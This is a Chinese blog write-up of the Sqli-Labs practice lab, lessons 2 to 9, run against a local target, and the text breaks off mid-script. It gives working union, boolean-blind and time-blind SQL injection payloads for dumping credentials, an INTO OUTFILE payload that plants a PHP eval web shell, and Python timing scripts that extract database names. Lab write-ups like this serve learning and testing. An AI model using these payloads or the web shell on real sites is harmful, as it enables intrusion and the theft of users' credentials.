<!DOCTYPE html>
<html class="has-navbar-fixed-top">
<head>
    <meta charset="utf-8">
<title>Sqli-Labs - ShuYu</title>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.css">




<meta name="description" content="他浑身都是弱点，简直一无是处，但他靠着自己的力量一步步克服，最终成为了火影">





    <meta name="description" content="&amp;#x4E00;&amp;#x3001;Introduction&amp;#x7B2C;2~4&amp;#x9898;&amp;#x548C;Less-1&amp;#x7684;&amp;#x5DEE;&amp;#x4E0D;&amp;#x591A;&amp;#x5176;&amp;#x5B9E;&amp;#xFF0C;&amp;#x5230;&amp;#x4E86;&amp;#x7B2C;&amp;#x4E94;&amp;#x9898;,&amp;#x7B2C;&amp;#x516D;&amp;#x9898;&amp;#x5F00;&amp;#x59CB;&amp;#">
<meta property="og:type" content="article">
<meta property="og:title" content="Sqli-Labs">
<meta property="og:url" content="http://example.com/2019/04/27/Sqli-Labs/index.html">
<meta property="og:site_name" content="ShuYu">
<meta property="og:description" content="&amp;#x4E00;&amp;#x3001;Introduction&amp;#x7B2C;2~4&amp;#x9898;&amp;#x548C;Less-1&amp;#x7684;&amp;#x5DEE;&amp;#x4E0D;&amp;#x591A;&amp;#x5176;&amp;#x5B9E;&amp;#xFF0C;&amp;#x5230;&amp;#x4E86;&amp;#x7B2C;&amp;#x4E94;&amp;#x9898;,&amp;#x7B2C;&amp;#x516D;&amp;#x9898;&amp;#x5F00;&amp;#x59CB;&amp;#">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2019/04/27/Sqli-Labs/12.png">
<meta property="og:image" content="http://example.com/2019/04/27/Sqli-Labs/11.png">
<meta property="og:image" content="http://example.com/2019/04/27/Sqli-Labs/14.png">
<meta property="og:image" content="http://example.com/2019/04/27/Sqli-Labs/31.png">
<meta property="og:image" content="http://example.com/2019/04/27/Sqli-Labs/32.png">
<meta property="og:image" content="http://example.com/2019/04/27/Sqli-Labs/33.png">
<meta property="og:image" content="http://example.com/2019/04/27/Sqli-Labs/34.png">
<meta property="og:image" content="http://example.com/2019/04/27/Sqli-Labs/41.png">
<meta property="og:image" content="http://example.com/2019/04/27/Sqli-Labs/42.png">
<meta property="og:image" content="http://example.com/2019/04/27/Sqli-Labs/43.png">
<meta property="og:image" content="http://example.com/2019/04/27/Sqli-Labs/51.png">
<meta property="og:image" content="http://example.com/2019/04/27/Sqli-Labs/52.png">
<meta property="og:image" content="http://example.com/2019/04/27/Sqli-Labs/53.png">
<meta property="og:image" content="http://example.com/2019/04/27/Sqli-Labs/54.png">
<meta property="og:image" content="http://example.com/2019/04/27/Sqli-Labs/55.png">
<meta property="og:image" content="http://example.com/2019/04/27/Sqli-Labs/61.png">
<meta property="og:image" content="http://example.com/2019/04/27/Sqli-Labs/63.png">
<meta property="og:image" content="http://example.com/2019/04/27/Sqli-Labs/62.png">
<meta property="og:image" content="http://example.com/2019/04/27/Sqli-Labs/62.png">
<meta property="og:image" content="http://example.com/2019/04/27/Sqli-Labs/71.png">
<meta property="og:image" content="http://example.com/2019/04/27/Sqli-Labs/72.png">
<meta property="og:image" content="http://example.com/2019/04/27/Sqli-Labs/73.png">
<meta property="article:published_time" content="2019-04-26T20:00:56.000Z">
<meta property="article:modified_time" content="2020-11-24T04:52:38.406Z">
<meta property="article:author" content="ShuYu">
<meta property="article:tag" content="Sql-Injection">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2019/04/27/Sqli-Labs/12.png">





<link rel="icon" href="/images/logo.png">


<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/bulma/0.6.2/css/bulma.min.css">


<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/css/justifiedGallery.min.css">


<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-dark.min.css">


<link rel="stylesheet" href="../../../../css/style.css">


<script defer src="//use.fontawesome.com/releases/v5.0.8/js/all.js"></script>


    
    
    
    
    
    
    
    
    
    

    


<meta name="generator" content="Hexo 5.2.0"></head>
<body>
    
<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
    <div class="container">
        <div class="navbar-brand">
            <a class="navbar-item navbar-logo" href="../../../../index.html">
                
                <img src="../../../../images/logo.png" alt="" height="28">
                
            </a>
            <div class="navbar-burger">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>
        
        <div class="navbar-menu navbar-start">
            
            <a class="navbar-item "
               href="../../../../archives">Archives</a>
            
            <a class="navbar-item "
               href="../../../../friends">Friends</a>
            
            <a class="navbar-item "
               href="../../../../about">About</a>
            
            <a class="navbar-item "
               href="../../../../tags">Tags</a>
            
        </div>
        
        <div class="navbar-menu navbar-end">
            
            <a class="navbar-item search" title="Search" href="javascript:;">
                <i class="fas fa-search"></i>
            </a>
            
            
            
            <a class="navbar-item" title="GitHub" target="_blank" rel="noopener" href="https://github.com/bkfish">
                
                <i class="fab fa-github"></i>
                
            </a>
               
            
        </div>
    </div>
</nav>

    <section class="section">
    <div class="container">
    <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            Sqli-Labs
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            
                <time datetime="2019-04-26T20:00:56.000Z" itemprop="datePublished">Apr 27 2019</time>
            
        </span>
        
        <span class="column is-narrow article-category">
            <i class="far fa-folder"></i>
            <a class="article-category-link" href="../../../../categories/Web/">Web</a>
        </span>
        
        
        <span class="column is-narrow">
            
            
            35 minutes read (About 5308 words)
        </span>
        
    </div>
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <html><head></head><body><h3><span id="&#x4E00;-introduction">&#x4E00;&#x3001;Introduction</span></h3><p>&#x7B2C;2~4&#x9898;&#x548C;Less-1&#x7684;&#x5DEE;&#x4E0D;&#x591A;&#x5176;&#x5B9E;&#xFF0C;&#x5230;&#x4E86;&#x7B2C;&#x4E94;&#x9898;,&#x7B2C;&#x516D;&#x9898;&#x5F00;&#x59CB;&#x76F2;&#x6CE8;&#x6709;&#x70B9;&#x96BE;&#x4E86;&#xFF0C;&#x5B66;&#x4E86;&#x4E00;&#x6CE2;mysql&#x7684;&#x64CD;&#x4F5C;&#x8FD8;&#x662F;&#x6709;&#x4E9B;&#x6536;&#x83B7;</p>
<a id="more"></a>


<h3><span id="&#x4E8C;-hack">&#x4E8C;&#x3001;Hack</span></h3><h4><span id="less-2">Less-2</span></h4><p>&#x4F20;&#x5165;&#x4E00;&#x4E2A;&#x5355;&#x5F15;&#x53F7;&#x8BD5;&#x63A2;&#x6CE8;&#x5165;&#x70B9;&#xFF0C;&#x53D1;&#x73B0;&#x62A5;&#x9519;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">..... syntax to use near &apos;&apos; LIMIT 0,1&apos; at line 1<br></code></pre></td></tr></tbody></table></figure>
<!--more-->
<p>&#x63A8;&#x6D4B;&#x548C;Less-1&#x552F;&#x4E00;&#x7684;&#x533A;&#x522B;&#x5728;&#x4E8E;&#x6CA1;&#x6709;&#x5355;&#x5F15;&#x53F7;&#xFF0C;&#x53EA;&#x662F;&#x7528;&#x6570;&#x5B57;&#x8FDB;&#x884C;&#x67E5;&#x8BE2;&#xFF0C;&#x4F8B;&#x5982;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">SELECT * FROM users WHERE id=$id LIMIT 0,1<br></code></pre></td></tr></tbody></table></figure>
<p>&#x6240;&#x4EE5;payload&#x548C;Less-1&#x5DEE;&#x522B;&#x53EA;&#x5728;&#x4E8E;&#x4E00;&#x4E2A;&#x5355;&#x5F15;&#x53F7;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">-1 union select 1,2,3 %23<br>-1 union select 1,2,group_concat(schema_name) from information_schema.schemata%23<br>-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema= &apos;security&apos;%23<br>-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name= &apos;users&apos;%23<br>-1 union select 1,group_concat(username),group_concat(password) from users%23<br></code></pre></td></tr></tbody></table></figure>
<h4><span id="less-3">Less-3</span></h4><p>&#x9898;&#x76EE;&#x540D;&#x5B57;&#x53EB;&#xFF0C;Single quotes with twist string (&#x57FA;&#x4E8E;&#x9519;&#x8BEF;&#x7684;GET&#x5355;&#x5F15;&#x53F7;&#x53D8;&#x5F62;&#x5B57;&#x7B26;&#x578B;&#x6CE8;&#x5165;)<br>&#x6D4B;&#x8BD5; ?id=1&#x2019; &#x5F97;&#x5230;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">...... syntax to use near &apos;&apos;1&apos;&apos;) LIMIT 0,1&apos; at line 1<br></code></pre></td></tr></tbody></table></figure>
<p>&#x731C;&#x6D4B;&#x8BED;&#x53E5;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1<br></code></pre></td></tr></tbody></table></figure>
<p>&#x6240;&#x4EE5;&#x901A;&#x8FC7;&#x524D;&#x9762;&#x52A0; -1&#x2019;) &#x95ED;&#x5408;&#x524D;&#x9762; &#x5C3E;&#x90E8;&#x52A0;%23 &#xFF08;#&#x7684;url&#x7F16;&#x7801;&#xFF09;&#x4E2D;&#x95F4;&#x5C31;&#x53EF;&#x4EE5;&#x4E3A;&#x6240;&#x6B32;&#x4E3A;&#x4E86;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">SELECT * FROM users WHERE id=(&apos;   -1&apos;){{&#x4E3A;&#x6240;&#x6B32;&#x4E3A;}}#23    &apos;) LIMIT 0,1<br></code></pre></td></tr></tbody></table></figure>
<p>&#x6240;&#x4EE5;payload</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">-1&apos;)union select 1,2,3 %23<br>-1&apos;)union select 1,2,group_concat(schema_name) from information_schema.schemata%23&apos;<br>-1&apos;)union select 1,group_concat(table_name),3 from information_schema.tables where table_schema= &apos;security&apos;%23<br>-1&apos;)union select 1,2,group_concat(column_name) from information_schema.columns where table_name= &apos;users&apos;%23<br>-1&apos;)union select 1,group_concat(username),group_concat(password) from users%23<br></code></pre></td></tr></tbody></table></figure>
<h4><span id="less-4">Less-4</span></h4><p>&#x5C1D;&#x8BD5;&#x2019;&#x5E76;&#x672A;&#x53D1;&#x73B0;&#x62A5;&#x9519;&#xFF0C;&#x5C1D;&#x8BD5;&#x201D;&#x53D1;&#x73B0;&#x62A5;&#x9519;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">syntax to use near &apos;&quot;1&quot;&quot;) LIMIT 0,1&apos; at line 1<br></code></pre></td></tr></tbody></table></figure>
<p>&#x731C;&#x6D4B;&#x8BED;&#x53E5;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">SELECT * FROM users WHERE id=(&quot;$id&quot;) LIMIT 0,1<br></code></pre></td></tr></tbody></table></figure>
<p>&#x6240;&#x4EE5;payload&#x548C;3&#x5DEE;&#x4E0D;&#x591A;&#x53EA;&#x662F;&#x5355;&#x5F15;&#x53F7;&#x53D8;&#x53CC;&#x5F15;&#x53F7;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">-1&quot;)union select 1,2,3 %23<br>-1&quot;)union select 1,2,group_concat(schema_name) from information_schema.schemata%23&apos;<br>-1&quot;)union select 1,group_concat(table_name),3 from information_schema.tables where table_schema= &apos;security&apos;%23<br>-1&quot;)union select 1,2,group_concat(column_name) from information_schema.columns where table_name= &apos;users&apos;%23<br>-1&quot;)union select 1,group_concat(username),group_concat(password) from users%23<br></code></pre></td></tr></tbody></table></figure>
<h4><span id="less-5-&#x5728;&#x5BFC;&#x822A;&#x9875;&#x91CC;&#x663E;&#x793A;&#x7684;&#x662F;&#x8981;&#x4F7F;&#x7528;&#x53CC;&#x67E5;&#x8BE2;">Less-5 &#x5728;&#x5BFC;&#x822A;&#x9875;&#x91CC;&#x663E;&#x793A;&#x7684;&#x662F;&#x8981;&#x4F7F;&#x7528;&#x53CC;&#x67E5;&#x8BE2;</span></h4><p>&#x53D1;&#x73B0;&#x6B63;&#x5E38;&#x6216;&#x8005;&#x6CE8;&#x5165;&#x6210;&#x529F;&#x662F;&#x8FD9;&#x6837;&#x7684;<br><img src="12.png"><br>&#x800C;&#x4E00;&#x65E6;&#x51FA;&#x9519;&#x4F1A;&#x62A5;&#x9519;<br><img src="11.png"><br>&#x663E;&#x7136;&#x662F;&#x5E03;&#x5C14;&#x6CE8;&#x5165;&#x800C;&#x4E14;&#x731C;&#x6D4B;&#x8BED;&#x53E5;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1<br></code></pre></td></tr></tbody></table></figure>
<p>&#x5F53;&#x7136;&#x5C31;&#x53EF;&#x4EE5;&#x5F88;&#x591A;&#x64CD;&#x4F5C;&#x4E86;&#xFF0C;&#x901A;&#x8FC7;substr()&#x3001;ascii()&#x7206;&#x7834;&#x4E5F;&#x80FD;&#x5F97;&#x5230;&#x4E00;&#x5207;<br>&#x6253;&#x4E2A;&#x6BD4;&#x65B9;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;80%23     <br>//&#x622A;&#x53D6;&#x6570;&#x636E;&#x5E93;&#x4E0B;&#x7B2C;&#x4E00;&#x4E2A;&#x8868;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x4E0E;80ascii&#x503C;&#x8FDB;&#x884C;&#x5BF9;&#x6BD4;<br><br>&#x627E;&#x7B2C;&#x4E8C;&#x4E2A;&#x5B57;&#x7B26;&#x53EA;&#x9700;&#x8981;&#x6539;&#x6210;substr(&apos;xxx&apos;,2,1)&#x5373;&#x53EF;&#x3002;<br>&#x627E;&#x7B2C;&#x4E8C;&#x4E2A;&#x8868;&#x6539;&#x6210;limit 1,1<br></code></pre></td></tr></tbody></table></figure>
<p>&#x4E5F;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x62FF;&#x8FD9;&#x4E2A;&#x76F2;&#x6CE8;&#x811A;&#x672C;&#x7206;&#x7834;&#xFF0C;&#x53C2;&#x6570;&#x81EA;&#x5DF1;&#x6539;&#x5C31;&#x884C;&#x4E86;<br><img src="14.png"><br><a target="_blank" rel="noopener" href="https://github.com/Kit4y/Sql-Injection/blob/master/Src/Script/Bool-injection.py">https://github.com/Kit4y/Sql-Injection/blob/master/Src/Script/Bool-injection.py</a></p>
<h4><span id="less-6">Less-6</span></h4><p>Less-6&#x548C;Less-5&#x7684;&#x5173;&#x7CFB;&#x5C31;&#x548C;1&#x2642;2&#xFF0C;3&#x2642;4&#x7684;&#x5173;&#x7CFB;&#x4E00;&#x6837; &#x628A;&#x2019;&#x6539;&#x6210;&#x201D;&#x5728;&#x811A;&#x672C;&#x4E0A;&#x4FEE;&#x6539;&#x5C31;&#x5F88;&#x884C;&#x4E86;</p>
<h4><span id="&#x6587;&#x4EF6;&#x64CD;&#x4F5C;">&#x6587;&#x4EF6;&#x64CD;&#x4F5C;</span></h4><p>&#x7B2C;&#x4E03;&#x9898;&#x63D0;&#x793A;Dump into outfile&#xFF0C;&#x5373;&#x4F7F;&#x7528;&#x6587;&#x4EF6;&#x5BFC;&#x51FA;&#xFF0C;&#x7136;&#x540E;&#x7B2C;&#x4E5D;&#x7B2C;&#x5341;&#x9898;&#x901A;&#x8FC7;&#x57FA;&#x4E8E;&#x65F6;&#x95F4;&#x76F2;&#x6CE8;&#x7684;&#x811A;&#x672C;&#x4E5F;&#x62FF;&#x5230;&#x4E86;&#x6570;&#x636E;&#x5E93;&#x6240;&#x6709;&#x6570;&#x636E;&#xFF0C;&#x6162;&#x6162;&#x953B;&#x70BC;&#x81EA;&#x5DF1;&#x5199;py&#x7684;&#x80FD;&#x529B;&#x5427;&#x3002;</p>
<h4><span id="less-7">Less-7</span></h4><p>&#x672C;&#x5173;&#x7684;&#x6807;&#x9898;&#x662F;dump into outfile,&#x610F;&#x601D;&#x662F;&#x672C;&#x5173;&#x6211;&#x4EEC;&#x5229;&#x7528;&#x6587;&#x4EF6;&#x5BFC;&#x5165;&#x7684;&#x65B9;&#x5F0F;&#x8FDB;&#x884C;&#x6CE8;&#x5165;,&#x5176;&#x5B9E;&#x96BE;&#x70B9;&#x5728;&#x4E8E; &#x731C;&#x6D4B;SQL&#x8BED;&#x53E5;&#x548C;&#x5BFB;&#x627E;&#x7F51;&#x7AD9;&#x7684;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;&#xFF0C;&#x592A;&#x83DC;&#x4E86;&#x7684;&#x6211;&#x8FDE;&#x81EA;&#x5DF1;&#x672C;&#x5730;&#x90FD;&#x6253;&#x4E86;&#x5F88;&#x4E45;orz,&#x4E0D;&#x8FC7;&#x4E5F;&#x5B66;&#x5230;&#x8FD9;&#x4E2A;&#x9A9A;&#x64CD;&#x4F5C;</p>
<!--more-->
<p>&#x9996;&#x5148;&#x901A;&#x8FC7;&#x6D4B;&#x8BD5;&#x731C;&#x6E90;&#x7801;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">id&apos;)) LIMIT 0,1&quot;<br></code></pre></td></tr></tbody></table></figure>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">?id=1&apos;)) or 1=1--+<br></code></pre></td></tr></tbody></table></figure>
<p>&#x6CA1;&#x6709;&#x62A5;&#x9519;<br>&#x7136;&#x540E;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x6587;&#x4EF6;&#x5BFC;&#x5165;&#x5BFC;&#x51FA;&#xFF0C;&#x6211;&#x4E00;&#x5F00;&#x59CB;&#x8BD5;&#x4E86;&#x5F88;&#x4E45;&#x6CA1;&#x5199;&#x8FDB;&#x53BB;&#xFF0C;&#x627E;&#x5230;&#x4E86;&#x5927;&#x5E08;&#x5085;&#x7684;&#x535A;&#x5BA2;<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/HHTNAN/article/details/78520511">https://blog.csdn.net/HHTNAN/article/details/78520511</a>,&#x4E86;&#x89E3;&#x5230;MYSQL&#x6570;&#x636E;&#x5BFC;&#x51FA;&#x4E0E;&#x5BFC;&#x5165;&#xFF0C;secure_file_priv&#x53C2;&#x6570;&#x9700;&#x8981;&#x8BBE;&#x7F6E;<br>&#x5728;mysql&#x6587;&#x4EF6;&#x4E0B;&#x7684;my.ini&#x6587;&#x4EF6;&#x7684;<code>[mysqld]</code>&#x5199;&#x5165;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">secure_file_priv=&apos;&apos;<br></code></pre></td></tr></tbody></table></figure>
<p>&#x81F3;&#x4E8E;&#x4E3A;&#x4EC0;&#x4E48;&#xFF0C;&#x8BF7;&#x53C2;&#x8003;&#x5927;&#x5E08;&#x5085;&#x7684;&#x535A;&#x5BA2;<br>&#x7136;&#x540E;&#x5C31;&#x5F88;&#x987A;&#x5229;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">?id=1&apos;)) union select 1,2,3 into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\sqli-labs-master\\Less-7\\mima.php&quot;--+<br></code></pre></td></tr></tbody></table></figure>
<p><img src="31.png"></p>
<p>&#x7136;&#x540E;&#x5C31;&#x53EF;&#x4EE5;&#x5199;&#x5165;&#x4E00;&#x53E5;&#x8BDD;&#x6728;&#x9A6C;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">?id=1&apos;)) union select 1,2,&apos;&lt;?php @eval($_post[&quot;mima&quot;])?&gt;&apos; into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\sqli-labs-master\\Less-7\\mima.php&quot;--+<br></code></pre></td></tr></tbody></table></figure>
<p><img src="32.png"></p>
<h4><span id="less-8">Less-8</span></h4><p>&#x548C;Less-5&#x5C45;&#x7136;&#x4E00;&#x6837;&#x7684;&#xFF1F;&#x76F2;&#x6CE8;&#x811A;&#x672C;&#x90FD;&#x4E00;&#x6837;,&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#x7B2C;&#x4E94;&#x9898;<br><a target="_blank" rel="noopener" href="https://kit4y.github.io/2019/04/27/Sqli-Labs-Less-2-6/#more">https://kit4y.github.io/2019/04/27/Sqli-Labs-Less-2-6/#more</a></p>
<h4><span id="less-9">Less-9</span></h4><p>&#x9898;&#x76EE;&#x53EB;&#x505A;GET-Bind-Time based XXX&#x65F6;&#x95F4;&#x76F2;&#x6CE8;&#xFF0C;&#x6240;&#x4EE5;&#x4E13;&#x95E8;&#x67E5;&#x770B;&#x4E86;&#x4E00;&#x4E0B;&#x65F6;&#x95F4;&#x76F2;&#x6CE8;&#x548C;&#x5E03;&#x5C14;&#x6CE8;&#x5165;&#x7684;&#x4E00;&#x4E9B;&#x57FA;&#x7840;&#x77E5;&#x8BC6;</p>
<h4><span id="&#x65F6;&#x95F4;&#x76F2;&#x6CE8;">&#x65F6;&#x95F4;&#x76F2;&#x6CE8;&#xFF1A;</span></h4><p>&#x65F6;&#x95F4;&#x76F2;&#x6CE8;&#x5229;&#x7528;&#x524D;&#x63D0;&#x6761;&#x4EF6;&#xFF1A;<br>&#x9875;&#x9762;&#x4E0A;&#x6CA1;&#x6709;&#x663E;&#x793A;&#x4F4D;&#xFF0C;&#x4E5F;&#x6CA1;&#x6709;&#x8F93;&#x51FA;SQL&#x8BED;&#x53E5;&#x6267;&#x884C;&#x9519;&#x8BEF;&#x4FE1;&#x606F;&#x3002; &#x6B63; &#x786E;&#x7684;SQL&#x8BED;&#x53E5;&#x548C;&#x9519;&#x8BEF;&#x7684;SQL&#x8BED;&#x53E5;&#x8FD4;&#x56DE;&#x9875;&#x9762;&#x90FD;&#x4E00;&#x6837;&#xFF0C;&#x4F46;&#x662F;&#x52A0;&#x5165;sleep(5)&#x6761; &#x4EF6;&#x4E4B;&#x540E;&#xFF0C;&#x9875;&#x9762;&#x7684;&#x8FD4;&#x56DE;&#x901F;&#x5EA6;&#x660E;&#x663E;&#x6162;&#x4E86;5&#x79D2;&#x3002;</p>
<p>&#x65F6;&#x95F4;&#x76F2;&#x6CE8;&#x5E38;&#x7528;&#x51FD;&#x6570;&#xFF1A;<br>IF(&#x5224;&#x65AD;&#x8BED;&#x53E5;,A,B)<br>&#x5982;&#x679C;&#x5224;&#x65AD;&#x8BED;&#x53E5;&#x4E3A;&#x771F;&#xFF0C;&#x5219;&#x8FD4;&#x56DE;A<br>&#x4E3A;&#x5047;&#x5219;&#x8FD4;&#x56DE;B<br>&#x4E00;&#x822C;&#x548C;&#x5E03;&#x5C14;&#x76F2;&#x6CE8;&#x8BED;&#x53E5;&#x914D;&#x5408;&#x4F7F;&#x7528;&#xFF1A;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">if(ascii(substr(&#x201C;payload&#x201D;, 1, 1))=104, sleep(5), 1)<br></code></pre></td></tr></tbody></table></figure>
<p>&#x5982;&#x679C;&#x7B2C;&#x4E00;&#x4E2A;&#xFF0C;&#x53F7;&#x524D;&#x7684;&#x8BED;&#x53E5;&#x6210;&#x7ACB;&#xFF0C;&#x5219;&#x9875;&#x9762;&#x8FD4;&#x56DE;&#x901F;&#x5EA6;&#x6162;5&#x79D2;<br>&#x4E0D;&#x6210;&#x7ACB;&#xFF0C;&#x9875;&#x9762;&#x7ACB;&#x5373;&#x8FD4;&#x56DE;</p>
<p>&#x65F6;&#x95F4;&#x76F2;&#x6CE8;&#x8FC7;&#x7A0B;&#xFF1A;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">if((select count(schema_name) from information_schema. schemata)=9,sleep(5),1) //&#x5224;&#x65AD;&#x6570;&#x636E;&#x5E93;&#x4E2A;&#x6570;<br>if((select length(schema_name) from information_schem a.schemata limit 0,1)=18,sleep(5),1)<br>if((select ascii(substr((select schema_name from info rmation_schema.schemata limit 0,1),1,1)))=105,sleep(5),1)//&#x5224;&#x65AD; &#x7B2C;&#x4E00;&#x4E2A;&#x5E93;&#x7B2C;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;<br></code></pre></td></tr></tbody></table></figure>

<p>&#x6240;&#x4EE5;&#x672C;&#x9898;&#x5148;&#x75AF;&#x72C2;&#x8BD5;&#x63A2;,&#x53D1;&#x73B0;&#x4E0D;&#x7BA1;&#x548B;&#x6837;&#x90FD;&#x662F;&#x8FD4;&#x56DE;&#x4E00;&#x6837;&#x7684;&#xFF0C;&#x548C;&#x94C1;&#x7599;&#x7629;&#x4E00;&#x6837;&#xFF0C;&#x6240;&#x4EE5;&#x5C31;&#x80FD;&#x901A;&#x8FC7;&#x65F6;&#x95F4;&#x76F2;&#x6CE8;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">?id=1&apos; and sleep(3)%23<br></code></pre></td></tr></tbody></table></figure>
<p>&#x53D1;&#x73B0;&#x7B49;&#x4E86;3&#x79D2;&#x949F;&#x624D;&#x54CD;&#x5E94;&#x4E86;<br>&#x7136;&#x540E;&#x548C;&#x76F2;&#x6CE8;&#x4E00;&#x6837;&#x73A9;</p>
<figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><code class="hljs plain">1&apos; and If(ascii(substr(database(),1,1))&gt;115,1,sleep(5))--+<br></code></pre></td></tr></tbody></table></figure>
<p>&#x7136;&#x540E;&#x901A;&#x8FC7;&#x8FD9;&#x4E2A;&#x811A;&#x672C;&#x62FF;&#x5230;&#x5F53;&#x524D;&#x6570;&#x636E;&#x5E93;&#x7684;&#x540D;&#x5B57;</p>
<figure class="highlight python hljs"><table><tbody><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>url = <span class="hljs-string">&apos;http://localhost/sqli-labs-master/Less-9/?id=1&apos;</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check</span>(<span class="hljs-params">payload</span>):</span><br>	url_new = url + payload<br>	time_start = time.time()<br>	content = requests.get(url=url_new)<br>	time_end = time.time()<br>	<span class="hljs-keyword">if</span> time_end - time_start &gt;<span class="hljs-number">5</span>:<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>result  = <span class="hljs-string">&apos;&apos;</span><br>s = <span class="hljs-string">r&apos;0123456789abcdefghijklmnopqrstuvwxyz_&apos;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):<br>    flag=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s:<br>        payload = <span class="hljs-string">&quot;&apos;and if(substr(database(),%d,1)=&apos;%c&apos;,sleep(5),1)--+&quot;</span> % (i,c)<br>        print(<span class="hljs-string">&quot;Database name: &quot;</span>+result+<span class="hljs-string">&quot; | Payload: &quot;</span>+payload)<br>        <span class="hljs-keyword">if</span> check(payload):<br>            flag=<span class="hljs-number">1</span>;<br>            result += c<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">if</span>(flag==<span class="hljs-number">0</span>):<br>        print(<span class="hljs-string">&quot;Over&quot;</span>)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span> (result)<br></code></pre></td></tr></tbody></table></figure>
<p><img src="33.png"><br>&#x7136;&#x540E;&#x901A;&#x8FC7;&#x8FD9;&#x4E2A;&#x811A;&#x672C;&#x5F97;&#x5230;&#x7B2C;&#x4E00;&#x4E2A;security&#x6570;&#x636E;&#x8868;</p>
<figure class="highlight python hljs"><table><tbody><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>url = <span class="hljs-string">&apos;http://localhost/sqli-labs-master/Less-9/?id=1&apos;</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check</span>(<span class="hljs-params">payload</span>):</span><br>	url_new = url + payload<br>	time_start = time.time()<br>	content = requests.get(url=url_new)<br>	time_end = time.time()<br>	<span class="hljs-keyword">if</span> time_end - time_start &gt;<span class="hljs-number">5</span>:<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>result  = <span class="hljs-string">&apos;&apos;</span><br>panduan = <span class="hljs-string">&apos;&apos;</span><br>ll=<span class="hljs-number">0</span><br>s = <span class="hljs-string">r&apos;0123456789abcdefghijklmnopqrstuvwxyz&apos;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span 